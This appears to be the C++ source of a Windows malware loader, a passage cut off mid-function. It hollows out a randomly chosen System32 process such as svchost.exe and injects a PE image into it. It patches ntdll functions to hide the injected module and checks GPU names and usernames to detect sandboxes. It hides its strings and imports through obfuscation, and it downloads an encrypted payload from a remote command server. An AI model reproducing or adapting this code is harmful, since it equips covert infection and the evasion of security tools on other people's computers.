#include <string.h>
#include <stdio.h>
#include <Windows.h>
#include <string>
#include <vector>
#include <sys/stat.h>
#include <utility>
#include <string>
#include <vector>
#include <chrono>
#include <random>
#include <iostream>
#include <type_traits>
#include <ctime>
#include <chrono>
#include <random>
#include <algorithm>
#include <wininet.h>
#include <fstream>
#include <map>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")
#include <iostream>
#pragma comment(lib, "dxgi.lib")
#include <dxgi.h>
#include "Ecy.h"
#include "MyFunctions.h"
#include <regex>

#define DEBUG_MODE 0

typedef struct _PROCESS_BASIC_INFORMATION {
	PVOID Reserved1;
	PVOID PebBaseAddress;
	PVOID Reserved2[2];
	ULONG_PTR UniqueProcessId;
	PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

typedef enum _PROCESSINFOCLASS {
	ProcessBasicInformation = 0,
	ProcessDebugPort = 7,
	ProcessWow64Information = 26,
	ProcessImageFileName = 27,
	ProcessBreakOnTermination = 29
} PROCESSINFOCLASS;

typedef NTSTATUS(WINAPI* BOMANOS)(
	HANDLE           ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID            ProcessInformation,
	ULONG            ProcessInformationLength,
	PULONG_PTR       ReturnLength
	);



DWORD Podyom;

struct SharedData {
	DWORD signature;
	volatile bool dataReady;
	char buffer[256];
};

SharedData* findSharedData(HANDLE processHandle) {
	MEMORY_BASIC_INFORMATION mbi;
	uintptr_t address = 0;

	while (LI_FN(VirtualQueryEx).safe_cached()(processHandle, (LPCVOID)address, &mbi, sizeof(mbi))) {
		if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READWRITE) && mbi.RegionSize >= sizeof(SharedData)) {
			for (uintptr_t pos = (uintptr_t)mbi.BaseAddress; pos <= (uintptr_t)mbi.BaseAddress + mbi.RegionSize - sizeof(SharedData); pos += sizeof(DWORD)) {
				DWORD signature;
				SIZE_T bytesRead;
				if (LI_FN(ReadProcessMemory).safe_cached()(processHandle, (LPCVOID)pos, &signature, sizeof(DWORD), &bytesRead) && signature == 0xBA73593C) {
					return (SharedData*)pos;
				}
			}
		}
		address = (uintptr_t)mbi.BaseAddress + mbi.RegionSize;
	}
	return nullptr;
}


void SndMSG(DWORD pid, std::string message)
{
	HANDLE processHandle = LI_FN(OpenProcess).safe_cached()(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
	if (!processHandle) {
		//std::cerr << EC("Failed to open process!") << std::endl;

	}

	SharedData* remoteData = findSharedData(processHandle);
	if (!remoteData) {
		//std::cerr << EC("Could not find receiver memory!") << std::endl;
		LI_FN(CloseHandle).safe_cached()(processHandle);

	}

	SIZE_T bytesWritten;

	LI_FN(WriteProcessMemory).safe_cached()(processHandle, (LPVOID)&remoteData->buffer, message.c_str(), message.length() + 1, &bytesWritten);

	bool flag = true;
	LI_FN(WriteProcessMemory).safe_cached()(processHandle, (LPVOID)&remoteData->dataReady, &flag, sizeof(bool), &bytesWritten);

	//std::cout << EC("Message sent!") << std::endl;

	LI_FN(CloseHandle).safe_cached()(processHandle);
}

std::string getRawDomain(const std::string& url) {
	// Regex to capture the domain part
	std::regex domainRegex(R"(^(?:https?:\/\/)?([^\/:]+))", std::regex::icase);
	std::smatch match;

	if (std::regex_search(url, match, domainRegex)) {
		return match[1]; // The domain is in the first capture group
	}
	return url; // fallback (if regex fails, return original)
}

std::string DownloadString(std::string URL) {


	HINTERNET interwebs = InternetOpenA(EC("Mozilla/5.0 (Windows NT 14_73_31; WOW64)"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);

	HINTERNET urlFile;
	std::string rtn;
	if (interwebs) {
		urlFile = LI_FN(InternetOpenUrlA).safe_cached()(interwebs, URL.c_str(), NULL, NULL,
			INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, NULL);
		if (urlFile) {
			char buffer[20000];
			DWORD bytesRead;
			do {
				LI_FN(InternetReadFile).safe_cached()(urlFile, buffer, 20000, &bytesRead);
				rtn.append(buffer, bytesRead);
				LI_FN(memset).safe_cached()(buffer, 0, 20000);
			} while (bytesRead);
			LI_FN(InternetCloseHandle).safe_cached()(interwebs);
			LI_FN(InternetCloseHandle).safe_cached()(urlFile);
			return rtn;
		}
	}
	LI_FN(InternetCloseHandle).safe_cached()(interwebs);
	return rtn;

}


/*
static std::map<std::string, std::string> dns_cache;
std::string DownloadStringBetter(const std::string& domain, const std::string& path) {

	// Resolve IP if not cached
	if (!dns_cache.count(domain)) {
		auto enc1 = xorstr("A");
		HINTERNET hi = InternetOpenA(enc1.crypt_get(), 1, 0, 0, 0);
		enc1.crypt();

		auto enc2 = xorstr("");
		if (!hi) return std::string(enc2.crypt_get());
		enc2.crypt();

		auto enc3 = xorstr("https://dns.google/resolve?name=");
		auto enc4 = xorstr("&type=A");
		auto enc5 = xorstr("Accept: application/dns-json\r\n");

		HINTERNET hu = LI_FN(InternetOpenUrlA).safe_cached()(hi,
			(std::string(enc3.crypt_get()) + domain + std::string(enc4.crypt_get())).c_str(),
			enc5.crypt_get(), -1, 0x84800000, 0);

		enc3.crypt(); enc4.crypt(); enc5.crypt();

		if (hu) {
			char buf[4096]; DWORD br; std::string resp;
			while (LI_FN(InternetReadFile).safe_cached()(hu, buf, 4096, &br) && br)
				resp.append(buf, br);
			LI_FN(InternetCloseHandle).safe_cached()(hu);

			// Parse JSON for IP
			auto enc6 = xorstr("\"data\":\"");
			size_t pos = resp.find(std::string(enc6.crypt_get()));
			enc6.crypt();

			if (pos != std::string::npos && (pos += 8) < resp.length()) {
				size_t end = resp.find('"', pos);
				if (end != std::string::npos) {
					std::string ip = resp.substr(pos, end - pos);
					if (ip.find('.') != std::string::npos)
						dns_cache[domain] = ip;
				}
			}
		}
		LI_FN(InternetCloseHandle).safe_cached()(hi);

		auto enc7 = xorstr("");
		if (!dns_cache.count(domain)) return std::string(enc7.crypt_get());
		enc7.crypt();
	}

	// Download using resolved IP or fallback to direct domain
	auto enc8 = xorstr("A");
	HINTERNET hi = InternetOpenA(enc8.crypt_get(), 1, 0, 0, 0);
	enc8.crypt();

	auto enc9 = xorstr("");
	if (!hi) return std::string(enc9.crypt_get());
	enc9.crypt();

	// Try IP-based connection first
	auto enc10 = xorstr("Host: ");
	auto enc11 = xorstr("\r\n");
	auto enc12 = xorstr("http://");

	std::string headers = std::string(enc10.crypt_get()) + domain + std::string(enc11.crypt_get());
	enc10.crypt(); enc11.crypt();

	HINTERNET hu = LI_FN(InternetOpenUrlA).safe_cached()(hi,
		(std::string(enc12.crypt_get()) + dns_cache[domain] + path).c_str(),
		headers.c_str(), -1, 0x84000000, 0);
	enc12.crypt();

	// Fallback to direct domain if IP fails
	if (!hu) {
		auto enc13 = xorstr("http://");
		hu = LI_FN(InternetOpenUrlA).safe_cached()(hi,
			(std::string(enc13.crypt_get()) + domain + path).c_str(), 0, 0, 0x84000000, 0);
		enc13.crypt();

		if (!hu) {
			LI_FN(InternetCloseHandle).safe_cached()(hi);
			auto enc14 = xorstr("");
			return std::string(enc14.crypt_get());
		}
	}

	// Read response
	char buf[4096]; DWORD br; std::string result;
	while (LI_FN(InternetReadFile).safe_cached()(hu, buf, 4096, &br) && br)
		result.append(buf, br);
	LI_FN(InternetCloseHandle).safe_cached()(hu);
	LI_FN(InternetCloseHandle).safe_cached()(hi);
	return result;
}
*/

std::string decrypt(const std::string& encryptedBase64, const std::string& key) {


	std::string decoded;
	std::vector<int> decodingTable(256, -1);

	auto encrypted = xorstr("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
	const std::string base64Chars = std::string(encrypted.crypt_get());
	encrypted.crypt(); // Re-encrypt to clear decrypted data

	for (size_t i = 0; i < base64Chars.size(); i++) {
		decodingTable[base64Chars[i]] = i;
	}

	int val = 0, valb = -8;
	for (unsigned char c : encryptedBase64) {
		if (decodingTable[c] == -1) break;
		val = (val << 6) + decodingTable[c];
		valb += 6;
		if (valb >= 0) {
			decoded.push_back((val >> valb) & 0xFF);
			valb -= 8;
		}
	}

	std::string encryptedData = decoded;
	std::string decrypted;
	size_t keyLength = key.size();

	for (size_t i = 0; i < encryptedData.size(); ++i) {
		decrypted += encryptedData[i] ^ key[i % keyLength];
	}

	return decrypted;
}


std::string GRS(size_t length) {


	auto encrypted1 = xorstr("abcdefghijklmnopqrstuvwxyz");
	auto encrypted2 = xorstr("ABCDEFGHIJKLMNOPQRSTUVWXYZ");
	auto encrypted3 = xorstr("0123456789");

	const std::string charset =
		std::string(encrypted1.crypt_get()) +
		std::string(encrypted2.crypt_get()) +
		std::string(encrypted3.crypt_get());

	// Re-encrypt to clear decrypted data
	encrypted1.crypt();
	encrypted2.crypt();
	encrypted3.crypt();



	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dist(0, charset.size() - 1);


	std::string result;
	result.reserve(length);
	for (size_t i = 0; i < length; ++i) {
		result += charset[dist(gen)];
	}
	return result;
}





std::vector<uint8_t> Base64ToBytes(std::string bobak) {

	DWORD bytesNeeded;
	if (!LI_FN(CryptStringToBinaryA).safe()(bobak.c_str(), bobak.length(), CRYPT_STRING_BASE64, NULL, &bytesNeeded, NULL, NULL)) {

	}

	std::vector<BYTE> bytes(bytesNeeded);
	if (!LI_FN(CryptStringToBinaryA).safe()(bobak.c_str(), bobak.length(), CRYPT_STRING_BASE64, bytes.data(), &bytesNeeded, NULL, NULL)) {

	}

	return bytes;
}




extern "C" {

	MYFUNCTIONS_API LPCWSTR GetInjekt() {
		static std::vector<std::wstring> processNames;
		// Initialize the vector only once
		if (processNames.empty()) {
			// Decrypt each string individually and store
			auto enc1 = xorstr(L"C:\\Windows\\System32\\dllhost.exe");
			processNames.emplace_back(enc1.crypt_get()); enc1.crypt();

			auto enc2 = xorstr(L"C:\\Windows\\System32\\svchost.exe");
			processNames.emplace_back(enc2.crypt_get()); enc2.crypt();

			auto enc3 = xorstr(L"C:\\Windows\\System32\\DiskSnapshot.exe");
			processNames.emplace_back(enc3.crypt_get()); enc3.crypt();

			auto enc4 = xorstr(L"C:\\Windows\\System32\\fontdrvhost.exe");
			processNames.emplace_back(enc4.crypt_get()); enc4.crypt();

			auto enc5 = xorstr(L"C:\\Windows\\System32\\icacls.exe");
			processNames.emplace_back(enc5.crypt_get()); enc5.crypt();

			auto enc6 = xorstr(L"C:\\Windows\\System32\\IESettingSync.exe");
			processNames.emplace_back(enc6.crypt_get()); enc6.crypt();

			auto enc7 = xorstr(L"C:\\Windows\\System32\\ktmutil.exe");
			processNames.emplace_back(enc7.crypt_get()); enc7.crypt();

			auto enc8 = xorstr(L"C:\\Windows\\System32\\label.exe");
			processNames.emplace_back(enc8.crypt_get()); enc8.crypt();

			auto enc9 = xorstr(L"C:\\Windows\\System32\\LegacyNetUXHost.exe");
			processNames.emplace_back(enc9.crypt_get()); enc9.crypt();

			auto enc10 = xorstr(L"C:\\Windows\\System32\\licensingdiag.exe");
			processNames.emplace_back(enc10.crypt_get()); enc10.crypt();

			auto enc11 = xorstr(L"C:\\Windows\\System32\\LockAppHost.exe");
			processNames.emplace_back(enc11.crypt_get()); enc11.crypt();

			auto enc12 = xorstr(L"C:\\Windows\\System32\\lodctr.exe");
			processNames.emplace_back(enc12.crypt_get()); enc12.crypt();

			auto enc13 = xorstr(L"C:\\Windows\\System32\\logman.exe");
			processNames.emplace_back(enc13.crypt_get()); enc13.crypt();

			auto enc14 = xorstr(L"C:\\Windows\\System32\\LsaIso.exe");
			processNames.emplace_back(enc14.crypt_get()); enc14.crypt();

			auto enc15 = xorstr(L"C:\\Windows\\System32\\makecab.exe");
			processNames.emplace_back(enc15.crypt_get()); enc15.crypt();

			auto enc16 = xorstr(L"C:\\Windows\\System32\\mmgaserver.exe");
			processNames.emplace_back(enc16.crypt_get()); enc16.crypt();

			auto enc17 = xorstr(L"C:\\Windows\\System32\\mountvol.exe");
			processNames.emplace_back(enc17.crypt_get()); enc17.crypt();

			auto enc18 = xorstr(L"C:\\Windows\\System32\\netbtugc.exe");
			processNames.emplace_back(enc18.crypt_get()); enc18.crypt();

			auto enc19 = xorstr(L"C:\\Windows\\System32\\odbcconf.exe");
			processNames.emplace_back(enc19.crypt_get()); enc19.crypt();

			auto enc20 = xorstr(L"C:\\Windows\\System32\\PATHPING.EXE");
			processNames.emplace_back(enc20.crypt_get()); enc20.crypt();

			auto enc21 = xorstr(L"C:\\Windows\\System32\\pcalua.exe");
			processNames.emplace_back(enc21.crypt_get()); enc21.crypt();

			auto enc22 = xorstr(L"C:\\Windows\\System32\\print.exe");
			processNames.emplace_back(enc22.crypt_get()); enc22.crypt();

			auto enc23 = xorstr(L"C:\\Windows\\System32\\reg.exe");
			processNames.emplace_back(enc23.crypt_get()); enc23.crypt();

			auto enc24 = xorstr(L"C:\\Windows\\System32\\sc.exe");
			processNames.emplace_back(enc24.crypt_get()); enc24.crypt();

			auto enc25 = xorstr(L"C:\\Windows\\System32\\sdchange.exe");
			processNames.emplace_back(enc25.crypt_get()); enc25.crypt();

			auto enc26 = xorstr(L"C:\\Windows\\System32\\SecureBootEncodeUEFI.exe");
			processNames.emplace_back(enc26.crypt_get()); enc26.crypt();

			auto enc27 = xorstr(L"C:\\Windows\\System32\\SecurityHealthHost.exe");
			processNames.emplace_back(enc27.crypt_get()); enc27.crypt();

			auto enc28 = xorstr(L"C:\\Windows\\System32\\SensorDataService.exe");
			processNames.emplace_back(enc28.crypt_get()); enc28.crypt();

			auto enc29 = xorstr(L"C:\\Windows\\System32\\SgrmLpac.exe");
			processNames.emplace_back(enc29.crypt_get()); enc29.crypt();

			auto enc30 = xorstr(L"C:\\Windows\\System32\\sihost.exe");
			processNames.emplace_back(enc30.crypt_get()); enc30.crypt();

			auto enc31 = xorstr(L"C:\\Windows\\System32\\Spectrum.exe");
			processNames.emplace_back(enc31.crypt_get()); enc31.crypt();

			auto enc32 = xorstr(L"C:\\Windows\\System32\\SppExtComObj.Exe");
			processNames.emplace_back(enc32.crypt_get()); enc32.crypt();

			auto enc33 = xorstr(L"C:\\Windows\\System32\\sxstrace.exe");
			processNames.emplace_back(enc33.crypt_get()); enc33.crypt();

			auto enc34 = xorstr(L"C:\\Windows\\System32\\SyncHost.exe");
			processNames.emplace_back(enc34.crypt_get()); enc34.crypt();

			auto enc35 = xorstr(L"C:\\Windows\\System32\\TapiUnattend.exe");
			processNames.emplace_back(enc35.crypt_get()); enc35.crypt();

			auto enc36 = xorstr(L"C:\\Windows\\System32\\TCPSVCS.EXE");
			processNames.emplace_back(enc36.crypt_get()); enc36.crypt();

			auto enc37 = xorstr(L"C:\\Windows\\System32\\TieringEngineService.exe");
			processNames.emplace_back(enc37.crypt_get()); enc37.crypt();

			auto enc38 = xorstr(L"C:\\Windows\\System32\\tttracer.exe");
			processNames.emplace_back(enc38.crypt_get()); enc38.crypt();

			auto enc39 = xorstr(L"C:\\Windows\\System32\\ucsvc.exe");
			processNames.emplace_back(enc39.crypt_get()); enc39.crypt();

			auto enc40 = xorstr(L"C:\\Windows\\System32\\unlodctr.exe");
			processNames.emplace_back(enc40.crypt_get()); enc40.crypt();

			auto enc41 = xorstr(L"C:\\Windows\\System32\\UtcDecoderHost.exe");
			processNames.emplace_back(enc41.crypt_get()); enc41.crypt();
		}

		std::srand(static_cast<unsigned>(std::time(nullptr)));
		return processNames[std::rand() % processNames.size()].c_str();
	}

	MYFUNCTIONS_API bool patch_ZwQueryVirtualMemory(HANDLE hProcess, LPVOID module_ptr, HMODULE hNtdll)
	{

		if (!hNtdll) return false; // should never happen

		ULONGLONG pos = 8;
		DWORD oldProtect = 0;

		std::string virtmom = EC("ZwQueryVirtualMemory");


		ULONG_PTR _ZwQueryVirtualMemory = (ULONG_PTR)LI_FN(GetProcAddress).safe_cached()(hNtdll, virtmom.c_str());
		if (!_ZwQueryVirtualMemory || _ZwQueryVirtualMemory < pos) {

			return false;
		}

		virtmom.clear();

		LPVOID stub_ptr = (LPVOID)((ULONG_PTR)_ZwQueryVirtualMemory - pos);


		if (!LI_FN(VirtualProtectEx).safe_cached()(hProcess, stub_ptr, 0x20, PAGE_READWRITE, &oldProtect)) {
			return false;
		}

		LPVOID patch_space = LI_FN(VirtualAllocEx).safe_cached()(hProcess, 0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!patch_space) {

			return false;
		}
		BYTE stub_buffer_orig[0x20] = { 0 };
		SIZE_T out_bytes = 0;
		if (!LI_FN(ReadProcessMemory).safe_cached()(hProcess, stub_ptr, stub_buffer_orig, 0x20, &out_bytes) || out_bytes != 0x20) {
			return false;
		}
		const BYTE nop_pattern[] = { 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00 };


		if (LI_FN(memcmp).safe_cached()(stub_buffer_orig, nop_pattern, sizeof(nop_pattern)) != 0) {

			return false;
		}


		const size_t syscall_pattern_full = 8;
		const size_t syscall_pattern_start = 4;

		//DONT_START//
		const BYTE syscall_fill_pattern[] = {
			0x4C, 0x8B, 0xD1, //mov r10,rcx
			0xB8, 0xFF, 0x00, 0x00, 0x00 // mov eax,[syscall ID]
		};
		//DONT_END//


		if (LI_FN(memcmp).safe_cached()(stub_buffer_orig + pos, syscall_fill_pattern, syscall_pattern_start) != 0) {
			return false;
		}

		// prepare the patch to be applied on ZwQueryVirtualMemory:

		BYTE stub_buffer_patched[0x20] = { 0 };
		LI_FN(memcpy).safe_cached()(stub_buffer_patched, stub_buffer_orig, 0x20);

		const BYTE jump_back[] = { 0xFF, 0x25, 0xF2, 0xFF, 0xFF, 0xFF };


		LI_FN(memcpy).safe_cached()(stub_buffer_patched, &patch_space, sizeof(LPVOID));
		LI_FN(memset).safe_cached()(stub_buffer_patched + pos, 0x90, syscall_pattern_full);

		LI_FN(memcpy).safe_cached()(stub_buffer_patched + pos, jump_back, sizeof(jump_back));

		// prepare the trampoline:

		const BYTE jump_to_contnue[] = { 0xFF, 0x25, 0xEA, 0xFF, 0xFF, 0xFF };

		ULONG_PTR _ZwQueryVirtualMemory_continue = (ULONG_PTR)_ZwQueryVirtualMemory + syscall_pattern_full;

		//DONT_START//
		BYTE func_patch[] = {
			0x49, 0x83, 0xF8, 0x0E, //cmp r8,0xE -> is MEMORY_INFORMATION_CLASS == MemoryImageExtensionInformation?
			0x75, 0x22, // jne [continue to function]
			0x48, 0x3B, 0x15, 0x0B, 0x00, 0x00, 0x00, // cmp rdx,qword ptr ds:[addr] -> is ImageBase == module_ptr ?
			0x75, 0x19, // jne [continue to function]
			0xB8, 0xBB, 0x00, 0x00, 0xC0, // mov eax,C00000BB -> STATUS_NOT_SUPPORTED
			0xC3 //ret
		};
		//DONT_END//


		BYTE stub_buffer_trampoline[0x20 * 2] = { 0 };
		LI_FN(memcpy).safe_cached()(stub_buffer_trampoline, func_patch, sizeof(func_patch));

		LI_FN(memcpy).safe_cached()(stub_buffer_trampoline + 0x20, stub_buffer_orig, 0x20);
		LI_FN(memcpy).safe_cached()(stub_buffer_trampoline + 0x20 - sizeof(LPVOID), &module_ptr, sizeof(LPVOID));


		LI_FN(memcpy).safe_cached()(stub_buffer_trampoline + 0x20, &_ZwQueryVirtualMemory_continue, sizeof(LPVOID));
		LI_FN(memcpy).safe_cached()(stub_buffer_trampoline + 0x20 + pos + syscall_pattern_full, jump_to_contnue, sizeof(jump_to_contnue));

		const SIZE_T trampoline_full_size = 0x20 + pos + syscall_pattern_full + sizeof(jump_to_contnue);

		if (!LI_FN(WriteProcessMemory).safe_cached()(hProcess, stub_ptr, stub_buffer_patched, 0x20, &out_bytes) || out_bytes != 0x20) {
			return false;
		}
		if (!LI_FN(VirtualProtectEx).safe_cached()(hProcess, stub_ptr, 0x20, oldProtect, &oldProtect)) {
			return false;
		}


		if (!LI_FN(WriteProcessMemory).safe_cached()(hProcess, patch_space, stub_buffer_trampoline, trampoline_full_size, &out_bytes) || out_bytes != trampoline_full_size) {
			return false;
		}

		if (!LI_FN(VirtualProtectEx).safe_cached()(hProcess, patch_space, 0x20, PAGE_EXECUTE_READ, &oldProtect)) {
			return false;
		}

		LI_FN(FlushInstructionCache).safe_cached()(hProcess, stub_ptr, 0x20);
		return true;

	}



	MYFUNCTIONS_API bool patch_NtManageHotPatch64(HANDLE hProcess, HMODULE hNtdll)
	{
		if (!hNtdll) return false; // should never happen

		DWORD oldProtect = 0;

		//DONT_START//
		const BYTE hotpatch_patch[] = {
			0xB8, 0xBB, 0x00, 0x00, 0xC0, // mov eax,C00000BB -> STATUS_NOT_SUPPORTED
			0xC3 //ret
		};
		//DONT_END//


		const size_t syscall_pattern_full = 8;
		const size_t syscall_pattern_start = 4;

		//DONT_START//
		const BYTE syscall_fill_pattern[] = {
			0x4C, 0x8B, 0xD1, //mov r10,rcx
			0xB8, 0xFF, 0x00, 0x00, 0x00 // mov eax,[syscall ID]
		};
		//DONT_END//


		std::string gotpot = EC("NtManageHotPatch");


		ULONG_PTR _NtManageHotPatch = (ULONG_PTR)LI_FN(GetProcAddress).safe_cached()(hNtdll, gotpot.c_str());
		if (!_NtManageHotPatch) {
			return false;
		}

		gotpot.clear();


		LPVOID stub_ptr = (LPVOID)_NtManageHotPatch;

		if (!LI_FN(VirtualProtectEx).safe_cached()(hProcess, stub_ptr, 0x20, PAGE_READWRITE, &oldProtect)) {
			return false;
		}


		BYTE stub_buffer_orig[0x20] = { 0 };
		SIZE_T out_bytes = 0;
		if (!LI_FN(ReadProcessMemory).safe_cached()(hProcess, stub_ptr, stub_buffer_orig, 0x20, &out_bytes) || out_bytes != 0x20) {
			return false;
		}

		// confirm it is a valid syscall stub:
		if (LI_FN(memcmp).safe_cached()(stub_buffer_orig, syscall_fill_pattern, syscall_pattern_start) != 0) {
			return false;
		}


		if (!LI_FN(WriteProcessMemory).safe_cached()(hProcess, stub_ptr, hotpatch_patch, sizeof(hotpatch_patch), &out_bytes) || out_bytes != sizeof(hotpatch_patch)) {
			return false;
		}


		if (!LI_FN(VirtualProtectEx).safe_cached()(hProcess, stub_ptr, 0x20, oldProtect, &oldProtect)) {
			return false;
		}

		LI_FN(FlushInstructionCache).safe_cached()(hProcess, stub_ptr, sizeof(hotpatch_patch));
		return true;
	}


	MYFUNCTIONS_API int openar(std::vector<uint8_t> bittys) {

		PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)bittys.data();
		PIMAGE_NT_HEADERS64 NtHeader = (PIMAGE_NT_HEADERS64)(bittys.data() + DosHeader->e_lfanew);

		PROCESS_INFORMATION pi;
		STARTUPINFO si = { sizeof(si) };


		ULONG_PTR retlen;
		PROCESS_BASIC_INFORMATION pbi;

		void* newImgBase;
		DWORD64 ImgBaseAddress;

		HMODULE hNtdll = LI_FN(GetModuleHandleA).safe()(EC("ntdll"));


		HMODULE ntDll = LI_FN(LoadLibraryA).safe()(EC("ntdll.dll"));
		if (ntDll == nullptr) {
#if DEBUG_MODE
			(printf)(EC("Fail Load \n"));
#endif
			return 1;
		}

		std::string nqr = EC("NtQueryInformationProcess");

		BOMANOS NtQueryInformationProcess = (BOMANOS)LI_FN(GetProcAddress).safe_cached()(ntDll, nqr.c_str());
		nqr.clear();

		if (NtHeader->Signature != IMAGE_NT_SIGNATURE) {

			return 1;
		}

		if (!LI_FN(CreateProcessW).safe_cached()(GetInjekt(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {

#if DEBUG_MODE
			(printf)(EC("Fail Process \n"));
#endif

			return 1;
		}

		patch_NtManageHotPatch64(pi.hProcess, hNtdll);


		NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &retlen);

		newImgBase = LI_FN(VirtualAllocEx).safe_cached()(pi.hProcess, NULL, NtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		Podyom = pi.dwProcessId;


		if (newImgBase == NULL) {
#if DEBUG_MODE
			(printf)(EC("Fail Alloc \n"));

#endif
			return 1;
		}

		LI_FN(WriteProcessMemory).safe_cached()(pi.hProcess, newImgBase, bittys.data(), NtHeader->OptionalHeader.SizeOfHeaders, 0);


		PIMAGE_SECTION_HEADER SectionHeader = (PIMAGE_SECTION_HEADER)(bittys.data() + DosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64));

		for (int num = 0; num < NtHeader->FileHeader.NumberOfSections; num++) {
			if (!LI_FN(WriteProcessMemory).safe_cached()(pi.hProcess, (LPVOID)((DWORD64)newImgBase + SectionHeader->VirtualAddress), (LPVOID)((DWORD64)bittys.data() + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0)) {
#if DEBUG_MODE
				(printf)(EC("Fail Section \n"));
#endif
			}
			SectionHeader++;
		}


		ImgBaseAddress = (DWORD64)pbi.PebBaseAddress + 0x10;


		if (!LI_FN(WriteProcessMemory).safe_cached()(pi.hProcess, (LPVOID)ImgBaseAddress, &newImgBase, sizeof(newImgBase), 0)) {
#if DEBUG_MODE
			(printf)(EC("Fail ImgBas \n"));
#endif
		}


		HANDLE NewThread = LI_FN(CreateRemoteThread).safe_cached()(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD64)newImgBase + NtHeader->OptionalHeader.AddressOfEntryPoint), NULL, CREATE_SUSPENDED, NULL);


		if (!NewThread) {
#if DEBUG_MODE
			(printf)(EC("Fail Thrd \n"));

#endif
			return 1;
		}

		LI_FN(SuspendThread).safe_cached()(pi.hThread);

		patch_ZwQueryVirtualMemory(pi.hProcess, newImgBase, hNtdll);

		LI_FN(ResumeThread).safe_cached()(NewThread);

		LI_FN(FreeLibrary).safe_cached()(ntDll);


		return 0;
	}


	MYFUNCTIONS_API bool IsVT()
	{
		return false;
		IDXGIFactory* pFactory;

		IDXGIAdapter* pAdapter;
		std::string gpuName = EC("Unknown");



		if (SUCCEEDED(CreateDXGIFactory(__uuidof(IDXGIFactory), (void**)&pFactory))) {

			if (SUCCEEDED(pFactory->EnumAdapters(0, &pAdapter))) {
				DXGI_ADAPTER_DESC desc;
				if (SUCCEEDED(pAdapter->GetDesc(&desc))) {
					char buffer[128];
					wcstombs(buffer, desc.Description, sizeof(buffer));
					gpuName = std::string(buffer);

				}
				pAdapter->Release();

			}
			pFactory->Release();
		}



		std::string GPUNMM = gpuName;
		std::string un;


		try
		{
			DWORD bufferLength = 256 + 1;

			char username[256 + 1];
			if (LI_FN(GetUserNameA).safe_cached()(username, &bufferLength))
			{
				un = username;

			}
		}
		catch (...)
		{
			un = EC("Unknown");
		}


		auto enc1 = xorstr("Microsoft Basic Render");
		if (GPUNMM.find(std::string(enc1.crypt_get())) != std::string::npos) {
			enc1.crypt();

			auto enc2 = xorstr("george");
			auto enc3 = xorstr("Bruno");
			auto enc4 = xorstr("Abby");
			auto enc5 = xorstr("AMF");
			auto enc6 = xorstr("dx");
			auto enc7 = xorstr("John");
			auto enc8 = xorstr("elz");

			if (un == std::string(enc2.crypt_get()) || un == std::string(enc3.crypt_get()) ||
				un == std::string(enc4.crypt_get()) || un == std::string(enc5.crypt_get()) ||
				un == std::string(enc6.crypt_get()) || un == std::string(enc7.crypt_get()) ||
				un == std::string(enc8.crypt_get()))
			{
				enc2.crypt(); enc3.crypt(); enc4.crypt(); enc5.crypt();
				enc6.crypt(); enc7.crypt(); enc8.crypt();
				return true;
			}
			enc2.crypt(); enc3.crypt(); enc4.crypt(); enc5.crypt();
			enc6.crypt(); enc7.crypt(); enc8.crypt();
		}
		else {
			enc1.crypt();

			auto enc9 = xorstr("NVIDIA GeForce RTX 3060 Ti");
			if (GPUNMM.find(std::string(enc9.crypt_get())) != std::string::npos) {
				enc9.crypt();

				auto enc10 = xorstr("Admin");
				if (un == std::string(enc10.crypt_get()))
				{
					enc10.crypt();
					return true;
				}
				enc10.crypt();
			}
			else {
				enc9.crypt();

				auto enc11 = xorstr("Unknown");
				if (GPUNMM.find(std::string(enc11.crypt_get())) != std::string::npos) {
					enc11.crypt();
					return true;
				}
				else
				{
					enc11.crypt();
					return false;
				}
			}
		}
	}

	MYFUNCTIONS_API int Mannot(std::string ownrdid, std::string bldsid, std::string MainURL)
	{

		if (IsVT())
		{

		}
		else
		{


			LI_FN(Sleep).safe_cached()(5000);


			auto enc1 = xorstr("Global\\x");
			LI_FN(CreateMutexA).safe_cached()(NULL, TRUE, (std::string(enc1.crypt_get()) + bldsid).c_str());
			enc1.crypt();

#if DEBUG_MODE
			(printf)(EC("Before Mutex 1 \n"));

#endif



			if (LI_FN(GetLastError).safe()() == ERROR_ALREADY_EXISTS) {


			}
			else
			{




#if DEBUG_MODE
				(printf)(EC("Before Mutex 2 \n"));

#endif
				//(Sleep)(3000);



				auto enc2 = xorstr("Global\\m");
				if (LI_FN(OpenMutexA).safe_cached()(MUTEX_ALL_ACCESS, FALSE, (std::string(enc2.crypt_get()) + ownrdid).c_str()) != NULL) {
					enc2.crypt();
					*(uintptr_t*)0 = 0;
				}
				else
				{
#if DEBUG_MODE
					(printf)(EC("Before All \n"));

#endif
					//(Sleep)(3000);

					MainURL = getRawDomain(MainURL);


#if DEBUG_MODE
					std::cout << MainURL << std::endl;

					(printf)(EC("All ok lol \n"));
#endif

					LI_FN(Sleep).safe_cached()(2000);
					try
					{


						int retry = 0;
						std::string msgr = ownrdid + EC(":") + bldsid + EC(":") + MainURL;


					A:


						std::string StbRD = GRS(5);

						auto enc3 = xorstr("/index.php?security=1&type=H3&id=");

						std::string MainURLaq = EC("https://") +  MainURL + enc3.crypt_get();

						std::string bobak = decrypt(DownloadString(MainURLaq + StbRD), StbRD);
						enc3.crypt();


						StbRD.clear();

